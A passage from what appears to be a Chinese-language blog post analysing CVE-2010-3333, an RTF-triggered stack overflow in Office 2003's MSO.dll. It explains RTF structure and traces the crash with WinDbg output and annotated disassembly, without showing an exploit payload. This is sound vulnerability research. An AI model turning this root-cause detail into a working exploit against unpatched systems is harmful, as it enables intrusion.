...}组</code>中，因此是<code>RTF文件主体</code>的一部分。它受<code>\pard</code>命令<code>指定的格式</code>的约束。具体来说，<code>\pard</code>重置任何先前的<code>段落格式</code>，<code>\plain</code>重置任何先前的<code>字符格式</code>，并且<code>\fs20</code>将<code>字体大小</code>设置为<code>20 half points</code>，即<code>10points</code>。</p><p>&emsp;&emsp;如前所述，<code>反斜杠(\)</code>和<code>花括号({})</code>在RTF中具有<code>特殊含义</code>。要将这些字符用作<code>文本</code>，请在其前面加上<code>反斜杠</code>，例如控制符<code>“\\”</code>，<code>“\{”</code>和<code>“\}”</code>。</p><h5 id="2-2、RTF文件的内容"><a href="#2-2、RTF文件的内容" class="headerlink" title="2.2、RTF文件的内容"></a>2.2、RTF文件的内容</h5><p>&emsp;&emsp;一个<code>完整的RTF文件</code>包括文件头<code>&lt;header&gt;</code>和文档区<code>&lt;document&gt;</code>两大部分，可以用下列语法表示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;File&gt; &apos;&#123;&apos; &lt;header&gt; &lt;document&gt; &apos;&#125;&apos;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;通过<code>RTF的文档目录</code>，我们可以了解到<code>文件头</code>和<code>文档区</code>各自所包含的数据，如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Contents of an RTF file</span><br><span class="line">    Header(头)</span><br><span class="line">        RTF Version(RTF版本：\rtfN,N为RTF文档规范版本的主要版本)</span><br><span class="line">        Character Set(字符集：\ansi)</span><br><span class="line">        Unicode RTF(Unicode支持)</span><br><span class="line">        Default Fonts and Languages(默认字体和语言)</span><br><span class="line">        Theme Data(主题数据：\themedata)</span><br><span class="line">        Color Scheme Mapping(配色方案映射：\colorschememapping)</span><br><span class="line">        Font Table(字体表：\fonttbl)</span><br><span class="line">        File Table(文件表：\filetbl,当前文档含子文档时，会有这个表)</span><br><span class="line">        Color Table(颜色表：\colortbl,屏幕颜色、字符颜色和其他颜色信息)</span><br><span class="line">        Default Properties(默认属性：\*\defchp,\*\defpap)</span><br><span class="line">        Style Sheet(样式表：\stylesheet)</span><br><span class="line">        List Tables</span><br><span class="line">        Paragraph Group Properties(段落组属性：\pgptbl)</span><br><span class="line">        Revision Marks(修订标记：\*\revtbl)</span><br><span class="line">        User Protection Information(用户保护信息：\protusertbl)</span><br><span class="line">    Document Area(文档区域)</span><br><span class="line">        Information Group(信息组：\info,可以包括标题、作者、关键词、注释和其他特定于该文件的信息。)</span><br><span class="line">        Read-Only Password Protection(只读密码保护：\passwordhash,表示编辑给定RTF文档所需的密码。)</span><br><span class="line">        XML Namespace Table(XML命名空间表：\xmlnstbl)</span><br><span class="line">        Document Formatting Properties(文档格式属性：这些属性必须在文档中的第一个纯文本字符之前。)</span><br><span class="line">        Mail Merge(邮件合并指的是一种操作，通过这种操作，RTF文档与来自外部数据源的数据一起工作。)</span><br><span class="line">        Section Text(节文本)</span><br><span class="line">        Paragraph Text(段落文本)</span><br><span class="line">        Mathematics(数学运算)</span><br><span class="line">        Character Text(字符文本：包括字体格式属性，字符边界和阴影，字符修改标记属性，高亮显示，特殊字符)</span><br><span class="line">        Document Variables(文档变量：\docvar)</span><br><span class="line">        Bookmarks(书签：\*\bkmkstart,\*\bkmkend)</span><br><span class="line">        Protection Exceptions(\*\protstart,\*\protend)</span><br><span class="line">        Pictures(图片：\pict,RTF文件可以包含用其他应用程序创建的图片。)</span><br><span class="line">        Custom XML Tags()</span><br><span class="line">        Objects(对象：\object,对象是包含数据和结果的目的地。数据通常对生成文档的应用程序隐藏。)</span><br><span class="line">        Drawing Objects(绘图对象：绘图对象的主体被定义为一系列属性。控制字&#123;\shp…后面跟着&#123;\*\shpinst，然后是一个形状的所有属性列表。)</span><br><span class="line">        Footnotes(脚注：\footnote)</span><br><span class="line">        Comments (Annotations)(注释：RTF注释有两部分，作者ID(由控制字\atnid引入)和注释文本(由控制字\annotation引入);)</span><br><span class="line">        Fields(域：\field)</span><br><span class="line">        Index Entries(索引项：\xe控制字引入一个索引项。RTF中的索引项是目的地。)</span><br><span class="line">        Table of Contents Entries(目录条目：\tc,\tcn)</span><br><span class="line">        Bidirectional Language Support(双向语言支持：)</span><br></pre></td></tr></table></figure><h3 id="0x32-定位漏洞点"><a href="#0x32-定位漏洞点" class="headerlink" title="0x32 定位漏洞点"></a>0x32 定位漏洞点</h3><h4 id="1、XP-amp-Office2003"><a href="#1、XP-amp-Office2003" class="headerlink" title="1、XP &amp; Office2003"></a>1、XP &amp; Office2003</h4><p>&emsp;&emsp;首先打开<code>WINWORD.exe</code>，然后打开<code>WinDbg</code>，Attach上WINWORD.exe的进程，程序会自动中断在<code>ntdll!DbgBreakPoint</code>处，<code>g</code>运行程序，然后打开<code>CVE-2010-3333(target6,Crash).rtf</code>文件，程序会中断在<code>MSO.dll</code>的<code>0x30ed442c</code>处，此处就是<code>触发异常</code>的指令：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">011</span>&gt; g</span><br><span class="line"><span class="symbol">ModLoad:</span> <span class="number">05450000</span> 055f1000   C:\Program Files\Microsoft Office\OFFICE11\GdiPlus.DLL</span><br><span class="line"><span class="symbol">ModLoad:</span> 76f20000 76f28000   C:\WINDOWS\system32\WTSAPI32.DLL</span><br><span class="line"><span class="symbol">ModLoad:</span> 762d0000 762e0000   C:\WINDOWS\system32\WINSTA.dll</span><br><span class="line">(a44<span class="meta">.628</span>): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected <span class="keyword">and</span> handled.</span><br><span class="line"><span class="built_in">eax</span>=0000c8ac <span class="built_in">ebx</span>=<span class="number">05000000</span> <span class="built_in">ecx</span>=<span class="number">00000022</span> <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=1104c830 <span class="built_in">edi</span>=<span class="number">00130000</span> &lt;---</span><br><span class="line"><span class="built_in">eip</span>=30ed442c <span class="built_in">esp</span>=001237b4 <span class="built_in">ebp</span>=001237ec iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00010206</span></span><br><span class="line">*** ERROR: Symbol file could <span class="keyword">not</span> be found.  Defaulted to export symbols for C:\Program Files\<span class="meta">Common</span> Files\Microsoft Shared\office11\mso.dll - </span><br><span class="line">mso!Ordinal1246+<span class="number">0x16b0</span>:</span><br><span class="line">30ed442c f3a5            <span class="keyword">rep</span> movs <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>],<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>]</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; !address <span class="built_in">edi</span></span><br><span class="line"><span class="symbol">Usage:</span>                  MemoryMappedFile</span><br><span class="line">Allocation Base:        <span class="number">00130000</span></span><br><span class="line">Base Address:           <span class="number">00130000</span></span><br><span class="line">End Address:            <span class="number">00133000</span></span><br><span class="line">Region Size:            <span class="number">00003000</span></span><br><span class="line"><span class="symbol">Type:</span>                   <span class="number">00040000</span>MEM_MAPPED</span><br><span class="line"><span class="symbol">State:</span>                  <span class="number">00001000</span>MEM_COMMIT</span><br><span class="line"><span class="symbol">Protect:</span>                <span class="number">00000002</span>PAGE_READONLY &lt;---</span><br><span class="line">Mapped file name:       PageFile</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; lm v m mso</span><br><span class="line">start    end        module name</span><br><span class="line">30c90000 3184c000   mso        (export symbols)       C:\Program Files\<span class="meta">Common</span> Files\Microsoft Shared\office11\mso.dll</span><br><span class="line">    Loaded symbol image file: C:\Program Files\<span class="meta">Common</span> Files\Microsoft Shared\office11\mso.dll</span><br><span class="line">    Image path: C:\Program Files\<span class="meta">Common</span> Files\Microsoft Shared\office11\mso.dll</span><br><span class="line">    Image name: mso.dll</span><br><span class="line"><span class="symbol">    Timestamp:</span>        Tue Jun <span class="number">19</span> <span class="number">07</span>:<span class="number">53</span>:<span class="number">36</span> <span class="number">2007</span> (46771B00)</span><br><span class="line"><span class="symbol">    CheckSum:</span>         00BB6E3C</span><br><span class="line"><span class="symbol">    ImageSize:</span>        00BBC000</span><br><span class="line">    File version:     <span class="number">11.0</span><span class="meta">.8172</span><span class="meta">.0</span></span><br><span class="line">    Product version:  <span class="number">11.0</span><span class="meta">.8172</span><span class="meta">.0</span></span><br><span class="line">    File flags:       <span class="number">0</span> (Mask 3F)</span><br><span class="line">    File OS:          <span class="number">40004</span> NT Win32</span><br><span class="line">    File type:        <span class="number">2.0</span> Dll</span><br><span class="line">    File date:        <span class="number">00000000.00000000</span></span><br><span class="line"><span class="symbol">    Translations:</span>     <span class="number">0000.04e4</span></span><br><span class="line"><span class="symbol">    CompanyName:</span>      Microsoft Corporation</span><br><span class="line"><span class="symbol">    ProductName:</span>      Microsoft Office <span class="number">2003</span></span><br><span class="line"><span class="symbol">    InternalName:</span>     MSO</span><br><span class="line"><span class="symbol">    OriginalFilename:</span> MSO.DLL</span><br><span class="line"><span class="symbol">    ProductVersion:</span>   <span class="number">11.0</span><span class="meta">.8172</span></span><br><span class="line"><span class="symbol">    FileVersion:</span>      <span class="number">11.0</span><span class="meta">.8172</span></span><br><span class="line"><span class="symbol">    FileDescription:</span>  Microsoft Office <span class="number">2003</span> component</span><br><span class="line"><span class="symbol">    LegalCopyright:</span>   Copyright © <span class="number">1983</span>-<span class="number">2003</span> Microsoft Corporation.  All rights reserved.</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;根据<code>调试器</code>输出的信息，可以知道，这是一个<code>异常</code>在异常处理之前<code>第一次</code>发送给<code>调试器</code>，说明发生了一个异常。<code>0x30ed442c</code>处的指令可以看作是<code>rep movsd</code>，这条指令的作用是从<code>源地址(esi)</code>循环复制数据到<code>目的地址(edi)</code>，每次复制一个<code>dword</code>。我们可以看到此时的<code>目的地址(edi)</code>为<code>0x00130000</code>，在<code>32位</code>Windows中，此地址应该是<code>栈底</code>，栈底之后的内存应该是<code>不具有写权限</code>的，所以这里发生了<code>非法内存访问</code>。通过<code>“!address edi”</code>命令,我们可以知道<code>0x00130000</code>地址处的内存只具有<code>读权限</code>。通过<code>“lm v m mso”</code>命令，我们可以得到<code>MSO.dll</code>模块相关信息，如<code>加载基址</code>。如果开启了<code>ASLR</code>，其加载基址每次都会不同，当然在<code>Windows XP</code>中是不会变的，Windows XP只支持<code>PEB、TEB的ASLR</code>，不支持<code>映像的ASLR</code>。</p><p>&emsp;&emsp;经过这简单的分析，可以知道这个漏洞是<code>MSO.dll</code>中的一处<code>栈溢出</code>漏洞，由于未检测<code>复制数据的长度</code>，通过<code>rep movsd</code>指令循环复制内存数据到<code>栈</code>上，导致对<code>0x00130000</code>这个<code>只读</code>内存地址进行<code>写数据</code>，造成<code>非法访问内存异常</code>。</p><p>&emsp;&emsp;我们对<code>触发异常</code>的指令的地址<code>0x30ed442c</code>下断点，其位于<code>sub_30ED4406</code>函数中，我们称其为<code>CrashFun</code>，通过<code>栈回溯</code>查看是哪个函数调用了<code>sub_30ED4406</code>函数。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">010</span>&gt; <span class="built_in">bp</span> 30ed442c</span><br><span class="line">*** ERROR: Symbol file could <span class="keyword">not</span> be found.  Defaulted to export symbols for C:\Program Files\<span class="meta">Common</span> Files\Microsoft Shared\office11\mso.dll - </span><br><span class="line"><span class="number">0</span>:<span class="number">010</span>&gt; g</span><br><span class="line"><span class="symbol">ModLoad:</span> <span class="number">06740000</span> 068e1000   C:\Program Files\Microsoft Office\OFFICE11\GdiPlus.DLL</span><br><span class="line"><span class="symbol">ModLoad:</span> 76f20000 76f28000   C:\WINDOWS\system32\WTSAPI32.DLL</span><br><span class="line"><span class="symbol">ModLoad:</span> 762d0000 762e0000   C:\WINDOWS\system32\WINSTA.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> 5fdd0000 5fe25000   C:\WINDOWS\system32\NETAPI32.dll</span><br><span class="line">Breakpoint <span class="number">0</span> hit</span><br><span class="line"><span class="built_in">eax</span>=0000c8ac <span class="built_in">ebx</span>=<span class="number">05000000</span> <span class="built_in">ecx</span>=0000322b <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=1104000c <span class="built_in">edi</span>=001237dc</span><br><span class="line"><span class="built_in">eip</span>=30ed442c <span class="built_in">esp</span>=001237b4 <span class="built_in">ebp</span>=001237ec iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">mso!Ordinal1246+<span class="number">0x16b0</span>:</span><br><span class="line">30ed442c f3a5            <span class="keyword">rep</span> movs <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>],<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>]</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; kb</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line"><span class="symbol">WARNING:</span> Stack unwind information <span class="keyword">not</span> available. Following frames may be wrong.</span><br><span class="line">001237ec 30f0b56b <span class="number">00123958</span> <span class="number">00000000</span> ffffffff mso!Ordinal1246+<span class="number">0x16b0</span></span><br><span class="line">0012381c 30f0b4f9 001239a4 <span class="number">00123958</span> <span class="number">00000000</span> mso!Ordinal1273+<span class="number">0x2581</span> &lt;----</span><br><span class="line">00123a68 30d4d795 <span class="number">00000000</span> 00123aa8 <span class="number">00000000</span> mso!Ordinal1273+<span class="number">0x250f</span></span><br><span class="line">00123a90 30d4d70d 30d4d5a8 01c40b88 01c40bc0 mso!Ordinal5575+<span class="number">0xf9</span></span><br><span class="line">00123a94 30d4d5a8 01c40b88 01c40bc0 01c40a70 mso!Ordinal5575+<span class="number">0x71</span></span><br><span class="line">00123a98 01c40b88 01c40bc0 01c40a70 30dce40c mso!Ordinal4099+<span class="number">0xf5</span></span><br><span class="line">00123a9c 01c40bc0 01c40a70 30dce40c <span class="number">00000000</span> <span class="number">0x1c40b88</span></span><br><span class="line">00123aa0 01c40a70 30dce40c <span class="number">00000000</span> 01c4084c <span class="number">0x1c40bc0</span></span><br><span class="line">00123aa4 30dce40c <span class="number">00000000</span> 01c4084c <span class="number">00124854</span> <span class="number">0x1c40a70</span></span><br><span class="line">00123aa8 <span class="number">00000000</span> 01c4084c <span class="number">00124854</span> <span class="number">00000000</span> mso!Ordinal2940+<span class="number">0x1588c</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; ub mso!Ordinal1273+<span class="number">0x2581</span></span><br><span class="line">mso!Ordinal1273+<span class="number">0x256d</span>:</span><br><span class="line">30f0b557 23c1            <span class="keyword">and</span>     <span class="built_in">eax</span>,<span class="built_in">ecx</span></span><br><span class="line">30f0b559 <span class="number">50</span>              <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line">30f0b55a 8d47ff          <span class="keyword">lea</span>     <span class="built_in">eax</span>,[<span class="built_in">edi</span>-<span class="number">1</span>]</span><br><span class="line">30f0b55d <span class="number">50</span>              <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line">30f0b55e 8b4508          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line">30f0b561 6a00            <span class="keyword">push</span>    <span class="number">0</span></span><br><span class="line">30f0b563 ff750c          <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">0Ch</span>]</span><br><span class="line">30f0b566 e857000000      <span class="keyword">call</span>    mso!Ordinal1273+<span class="number">0x25d8</span> (30f0b5c2)</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;通过<code>栈回溯</code>，我们可以知道<code>CrashFun(sub_30ED4406)</code>是在函数<code>sub_30F0B5C2</code>中调用的。重新调试，对<code>sub_30F0B5C2</code>函数下断点，从函数<code>sub_30F0B5C2</code>到溢出地址<code>0x30ed442c</code>开始单步调试(F10:步过,F8:步进)，经过处理后的结果如下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>30F0B544           loc_30F0B544                         <span class="comment">; CODE XREF: sub_30F0B506+2B↑j</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B544                                                <span class="comment">; sub_30F0B506+37↑j</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B544 8B <span class="number">75</span> <span class="number">10</span>               <span class="keyword">mov</span>     <span class="built_in">esi</span>, [<span class="built_in">ebp</span>+arg_8]</span><br><span class="line"><span class="symbol">.text:</span>30F0B547 <span class="number">83</span> <span class="number">65</span> FC <span class="number">00</span>            <span class="keyword">and</span>     [<span class="built_in">ebp</span>+var_4], <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B54B FF <span class="number">75</span> <span class="number">14</span>               <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_C]</span><br><span class="line"><span class="symbol">.text:</span>30F0B54E 8B C6                  <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B550 F7 D8                  <span class="keyword">neg</span>     <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B552 <span class="number">1B</span> C0                  <span class="keyword">sbb</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B554 <span class="number">8D</span> <span class="number">4D</span> FC               <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+var_4]</span><br><span class="line"><span class="symbol">.text:</span>30F0B557 <span class="number">23</span> C1                  <span class="keyword">and</span>     <span class="built_in">eax</span>, <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B559 <span class="number">50</span>                     <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B55A <span class="number">8D</span> <span class="number">47</span> FF               <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">edi</span>-<span class="number">1</span>]</span><br><span class="line"><span class="symbol">.text:</span>30F0B55D <span class="number">50</span>                     <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B55E 8B <span class="number">45</span> <span class="number">08</span>               <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_0]</span><br><span class="line"><span class="symbol">.text:</span>30F0B561 6A <span class="number">00</span>                  <span class="keyword">push</span>    <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B563 FF <span class="number">75</span> 0C               <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_4]</span><br><span class="line"><span class="symbol">.text:</span>30F0B566 E8 <span class="number">57</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>         <span class="keyword">call</span>    sub_30F0B5C2 &lt;-----</span><br><span class="line"><span class="symbol">.text:</span>30F0B56B <span class="number">84</span> C0                  <span class="keyword">test</span>    <span class="built_in">al</span>, <span class="built_in">al</span></span><br><span class="line">    |       |</span><br><span class="line">    ↓       ↓</span><br><span class="line">*************************************************************************************************</span><br><span class="line"></span><br><span class="line">    char __userpurge sub_30F0B5C2@&lt;<span class="built_in">al</span>&gt;(<span class="keyword">int</span> a1@&lt;<span class="built_in">eax</span>&gt;, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> *a5, <span class="keyword">int</span> a6)</span><br><span class="line"></span><br><span class="line">*************************************************************************************************</span><br><span class="line"><span class="symbol">.text:</span>30F0B5C2 <span class="number">55</span>                     <span class="keyword">push</span>    <span class="built_in">ebp</span>                 <span class="comment">;     ebp = 0x0012381c</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5C3 8B EC                  <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>            <span class="comment">;     ebp = esp = 0x001237ec</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5C5 <span class="number">83</span> EC <span class="number">14</span>               <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">14h</span>            <span class="comment">; 分配0x14字节栈空间: esp = esp-0x14 = 0x001237ec-0x14 = 0x001237d8 </span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5C8 <span class="number">83</span> <span class="number">7D</span> <span class="number">18</span> <span class="number">00</span>            <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+arg_10], <span class="number">0</span>     <span class="comment">;     [ebp+0x18] = [0x00123804]=0x01c40ba0</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5CC <span class="number">57</span>                     <span class="keyword">push</span>    <span class="built_in">edi</span>                 <span class="comment">;     edi = 0x00000000</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5CD 8B F8                  <span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="built_in">eax</span>            <span class="comment">;     edi = eax = 0x001239a4(像是对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5CF 0F <span class="number">84</span> <span class="number">1D</span> 4C <span class="number">18</span> <span class="number">00</span>      <span class="keyword">jz</span>      loc_310901F2        <span class="comment">;     不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5D5 8B 4F <span class="number">08</span>               <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">edi</span>+<span class="number">8</span>]        <span class="comment">; ecx = [edi+8] = [0x001239a4+0x8] = [0x001239ac] = 0x00123aa8(像是对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5D8 <span class="number">53</span>                     <span class="keyword">push</span>    <span class="built_in">ebx</span>                 <span class="comment">;     ebx = 0x00000000 </span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5D9 <span class="number">56</span>                     <span class="keyword">push</span>    <span class="built_in">esi</span>                 <span class="comment">;     esi = 0x00000000 </span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5DA E8 C4 E8 E1 FF         <span class="keyword">call</span>    sub_30D29EA3        <span class="comment">; thiscall</span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line">    ***********************************************************************</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">int</span> __thiscall sub_30D29EA3(_<span class="built_in">BYTE</span> *this)</span><br><span class="line"></span><br><span class="line">    ***********************************************************************</span><br><span class="line"><span class="symbol">    .text:</span>30D29EA3          sub_30D29EA3  proc <span class="built_in">near</span>              </span><br><span class="line"><span class="symbol">    .text:</span>30D29EA3                                               </span><br><span class="line"><span class="symbol">    .text:</span>30D29EA3 <span class="number">56</span>                     <span class="keyword">push</span>    <span class="built_in">esi</span>                 <span class="comment">; esi = 0x00000000</span></span><br><span class="line"><span class="symbol">    .text:</span>30D29EA4 8B F1                  <span class="keyword">mov</span>     <span class="built_in">esi</span>, <span class="built_in">ecx</span>            <span class="comment">; esi = ecx = 0x00123aa8(像是对象首地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>30D29EA6 <span class="number">57</span>                     <span class="keyword">push</span>    <span class="built_in">edi</span>                 <span class="comment">; edi = 0x001239a4(像是对象首地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>30D29EA7 <span class="number">8D</span> BE C0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>      <span class="keyword">lea</span>     <span class="built_in">edi</span>, [<span class="built_in">esi</span>+<span class="number">0C0h</span>]     <span class="comment">; edi = esi+0xc0 = 0x00123aa8+0xc0 = 0x00123B68</span></span><br><span class="line"><span class="symbol">    .text:</span>30D29EAD F6 <span class="number">07</span> <span 